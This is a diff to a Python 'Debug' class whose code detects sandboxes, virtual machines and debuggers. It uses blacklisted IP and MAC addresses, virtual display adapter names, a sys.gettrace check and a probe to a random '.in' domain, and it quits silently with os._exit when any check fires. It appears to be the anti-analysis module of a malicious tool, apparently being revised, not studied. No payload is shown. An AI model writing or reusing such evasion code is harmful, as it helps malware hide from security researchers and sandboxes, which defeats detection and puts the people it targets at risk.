@@ -1,9 +1,9 @@
 import os
 import psutil
 import random
+import requests
 import subprocess
 import sys
-from urllib3 import PoolManager
 
 class Debug:
 	def __init__(self):
@@ -89,7 +89,7 @@ class Debug:
 							"microsoft remote display adapter", "onrf_d", "pcwmg1n_e", "y9696y"]
 
 		if self.checks():
-			sys.exit(0)
+			os._exit(0)
 
 	def checks(self):
 		return (
@@ -108,12 +108,12 @@ class Debug:
 				except (psutil.NoSuchProcess, psutil.AccessDenied):
 					pass
 		if sys.gettrace():
-			sys.exit(0)
+			os._exit(0)
 
 	def get_network(self) -> bool:
 		try:
 			network_interfaces = psutil.net_if_addrs()
-			for interface, addresses in network_interfaces.items():
+			for _, addresses in network_interfaces.items():
 				for address in addresses:
 					if address.address in self.blacklisted_ips or address.address in self.blacklisted_macs:
 						return True
@@ -141,9 +141,8 @@ class Debug:
 		return r1 or r2
 
 	def checkHTTPSimulation(self) -> bool:
-		http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
 		try:
-			http.request('GET', f'https://blank-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in')
+			requests.get(f'https://luna-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in')
 		except Exception:
 			return False
 		else:
